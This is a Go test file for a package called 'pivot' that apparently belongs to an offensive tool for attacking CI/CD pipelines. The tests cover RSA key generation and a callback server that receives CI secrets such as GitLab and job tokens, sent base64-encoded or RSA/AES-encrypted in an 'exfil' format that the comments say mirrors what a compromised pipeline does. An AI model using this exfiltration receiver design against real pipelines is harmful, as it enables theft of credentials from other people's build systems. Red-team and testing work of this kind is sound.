package pivot

import (
	"bytes"
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"testing"
	"time"
)

func TestGenerateKeyPair(t *testing.T) {
	privKey, pubPEM, err := GenerateKeyPair(2048)
	if err != nil {
		t.Fatalf("GenerateKeyPair() error = %v", err)
	}
	if privKey == nil {
		t.Fatal("private key is nil")
		return
	}
	if pubPEM == "" {
		t.Fatal("public PEM is empty")
	}

	// Verify PEM parses back
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		t.Fatal("failed to decode PEM")
		return
	}
	if block.Type != "PUBLIC KEY" {
		t.Errorf("PEM type = %q, want PUBLIC KEY", block.Type)
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		t.Fatalf("ParsePKIXPublicKey() error = %v", err)
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		t.Fatal("not an RSA public key")
	}
	if rsaPub.N.BitLen() < 2048 {
		t.Errorf("key size = %d, want >= 2048", rsaPub.N.BitLen())
	}
}

func TestCallbackServerUnencrypted(t *testing.T) {
	cb := NewCallbackServer(nil, 10)

	// Create unencrypted payload
	secrets := map[string]string{
		"GITLAB_TOKEN": "glpat-test123",
		"PATH":         "/usr/bin",
	}
	secretsJSON, _ := json.Marshal(secrets)
	b64 := base64.StdEncoding.EncodeToString(secretsJSON)

	body := map[string]string{
		"data":        b64,
		"pipeline_id": "42",
	}
	bodyBytes, _ := json.Marshal(body)

	// Send to handler
	req := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(bodyBytes))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()

	// Process in background to read from channel
	done := make(chan *ExfilPayload, 1)
	go func() {
		select {
		case p := <-cb.incoming:
			done <- p
		case <-time.After(2 * time.Second):
			done <- nil
		}
	}()

	cb.handleCallback(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}

	payload := <-done
	if payload == nil {
		t.Fatal("no payload received")
		return
	}
	if payload.PipelineID != "42" {
		t.Errorf("PipelineID = %q, want 42", payload.PipelineID)
	}
	if payload.Secrets["GITLAB_TOKEN"] != "glpat-test123" {
		t.Errorf("GITLAB_TOKEN = %q, want glpat-test123", payload.Secrets["GITLAB_TOKEN"])
	}
}

func TestCallbackServerEncrypted(t *testing.T) {
	// Check if openssl is available (required for encryption compat test)
	if _, err := exec.LookPath("openssl"); err != nil {
		t.Skip("openssl not available")
	}

	// Generate RSA key pair
	privKey, pubPEM, err := GenerateKeyPair(2048)
	if err != nil {
		t.Fatalf("GenerateKeyPair() error = %v", err)
	}

	cb := NewCallbackServer(privKey, 10)

	// Simulate what the CI pipeline does:
	// 1. Create secrets.json
	secrets := map[string]string{
		"PRIVATE_TOKEN": "glpat-encrypted-tok",
		"CI_JOB_TOKEN":  "job-tok-123",
	}
	secretsJSON, _ := json.Marshal(secrets)

	// 2. Write pubkey to temp file and encrypt with openssl
	pubFile := t.TempDir() + "/pub.pem"
	if err := writeFile(pubFile, []byte(pubPEM)); err != nil {
		t.Fatalf("write pubkey: %v", err)
	}

	// 3. Generate AES key and encrypt secrets
	aesKey := "abcdef123456abcdef123456" // 24 hex chars like `openssl rand -hex 12`

	// Encrypt secrets.json with AES-256-CBC
	secretsFile := t.TempDir() + "/secrets.json"
	encFile := t.TempDir() + "/secrets.enc"
	if err := writeFile(secretsFile, secretsJSON); err != nil {
		t.Fatalf("write secrets: %v", err)
	}

	cmd := exec.Command("openssl", "enc", "-aes-256-cbc", "-pbkdf2",
		"-in", secretsFile, "-out", encFile, "-pass", "pass:"+aesKey)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("openssl enc: %v\n%s", err, out)
	}

	encData, err := readFile(encFile)
	if err != nil {
		t.Fatalf("read enc: %v", err)
	}

	// 4. Encrypt AES key with RSA
	aesKeyEncCmd := exec.Command("openssl", "pkeyutl", "-encrypt", "-pubin",
		"-inkey", pubFile, "-pkeyopt", "rsa_padding_mode:pkcs1")
	aesKeyEncCmd.Stdin = bytes.NewReader([]byte(aesKey))
	aesKeyEnc, err := aesKeyEncCmd.Output()
	if err != nil {
		// Fall back to rsautl for older openssl
		aesKeyEncCmd = exec.Command("openssl", "rsautl", "-encrypt", "-pkcs",
			"-pubin", "-inkey", pubFile)
		aesKeyEncCmd.Stdin = bytes.NewReader([]byte(aesKey))
		aesKeyEnc, err = aesKeyEncCmd.Output()
		if err != nil {
			t.Fatalf("openssl rsautl: %v", err)
		}
	}

	// 5. Build the callback payload (matching exfilHTTP format)
	encB64 := base64.StdEncoding.EncodeToString(encData)
	keyB64 := base64.StdEncoding.EncodeToString(aesKeyEnc)

	body := map[string]string{
		"payload":     encB64,
		"key":         keyB64,
		"pipeline_id": "99",
	}
	bodyBytes, _ := json.Marshal(body)

	// Send to handler
	req := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(bodyBytes))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()

	done := make(chan *ExfilPayload, 1)
	go func() {
		select {
		case p := <-cb.incoming:
			done <- p
		case <-time.After(5 * time.Second):
			done <- nil
		}
	}()

	cb.handleCallback(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", rec.Code, rec.Body.String())
	}

	payload := <-done
	if payload == nil {
		t.Fatal("no payload received")
		return
	}
	if payload.PipelineID != "99" {
		t.Errorf("PipelineID = %q, want 99", payload.PipelineID)
	}
	if payload.Secrets["PRIVATE_TOKEN"] != "glpat-encrypted-tok" {
		t.Errorf("PRIVATE_TOKEN = %q, want glpat-encrypted-tok", payload.Secrets["PRIVATE_TOKEN"])
	}
}

func TestCallbackServerReceiveTimeout(t *testing.T) {
	cb := NewCallbackServer(nil, 10)

	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	payload, err := cb.Receive(ctx, 10*time.Millisecond)
	if err == nil {
		t.Error("expected timeout error")
	}
	if payload != nil {
		t.Error("expected nil payload on timeout")
	}
}

func TestCallbackServerReceiveAll(t *testing.T) {
	cb := NewCallbackServer(nil, 10)

	// Push 3 payloads into the channel.
	for i := range 3 {
		secrets := map[string]string{
			"GITLAB_TOKEN": "glpat-test" + string(rune('A'+i)),
		}
		secretsJSON, _ := json.Marshal(secrets)
		b64 := base64.StdEncoding.EncodeToString(secretsJSON)

		body := map[string]string{"data": b64, "pipeline_id": string(rune('1' + i))}
		bodyBytes, _ := json.Marshal(body)

		req := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(bodyBytes))
		rec := httptest.NewRecorder()
		cb.handleCallback(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("callback %d: status = %d, want 200", i, rec.Code)
		}
	}

	// ReceiveAll should return all 3 without waiting for timeout.
	payloads, err := cb.ReceiveAll(context.Background(), 5*time.Second, 3)
	if err != nil {
		t.Fatalf("ReceiveAll() error = %v", err)
	}
	if len(payloads) != 3 {
		t.Fatalf("ReceiveAll() = %d payloads, want 3", len(payloads))
	}

	// Verify timeout behavior: no more payloads in channel, short timeout.
	start := time.Now()
	payloads, _ = cb.ReceiveAll(context.Background(), 50*time.Millisecond, 5)
	elapsed := time.Since(start)
	if len(payloads) != 0 {
		t.Errorf("ReceiveAll(empty channel) = %d payloads, want 0", len(payloads))
	}
	if elapsed < 40*time.Millisecond {
		t.Errorf("ReceiveAll(empty channel) returned too fast: %v", elapsed)
	}
}

func TestCallbackServerMalformedInput(t *testing.T) {
	cb := NewCallbackServer(nil, 10)

	tests := []struct {
		name       string
		body       string
		wantStatus int
	}{
		{"empty body", "", http.StatusBadRequest},
		{"invalid json", "{bad", http.StatusBadRequest},
		{"no data fields", `{"pipeline_id":"1"}`, http.StatusBadRequest},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/", bytes.NewBufferString(tt.body))
			rec := httptest.NewRecorder()
			cb.handleCallback(rec, req)
			if rec.Code != tt.wantStatus {
				t.Errorf("status = %d, want %d", rec.Code, tt.wantStatus)
			}
		})
	}
}

func writeFile(path string, data []byte) error {
	return os.WriteFile(path, data, 0o600)
}

func readFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}
